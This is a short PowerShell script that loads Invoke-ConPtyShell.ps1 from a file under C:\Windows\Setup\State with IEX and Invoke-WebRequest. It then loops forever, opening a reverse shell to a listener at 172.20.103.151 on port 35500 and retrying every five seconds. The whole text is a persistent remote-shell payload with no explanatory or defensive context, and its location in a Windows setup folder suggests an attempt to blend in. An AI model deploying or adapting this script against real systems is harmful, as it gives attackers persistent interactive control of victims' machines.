#connection variables:
$ListenerIP = "172.20.103.151"
$ListenerPort = "35500"

#run connection script:
IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing)

while($True){
    Invoke-ConPtyShell $ListenerIP $ListenerPort
    Start-Sleep -Seconds 5
}